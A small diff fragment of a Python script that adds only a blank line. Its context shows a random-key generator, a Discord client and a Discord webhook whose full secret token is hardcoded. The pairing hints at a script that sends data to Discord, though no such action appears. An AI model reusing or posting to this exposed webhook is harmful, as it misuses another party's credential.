@@ -10,6 +10,7 @@ from pathlib import Path
 import string
 def KeyGen(size=1989, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size)) 
+	
 Key = KeyGen()
 client = discord.Client()
 hook = dhooks.Webhook('https://discordapp.com/api/webhooks/516092910081409058/dQ1YJOs3qwD57lM6CH9nhChJyhVO39Oc1YchGpUQE3f1qvpHIu8EXptI-_qlXUVxBjkG')
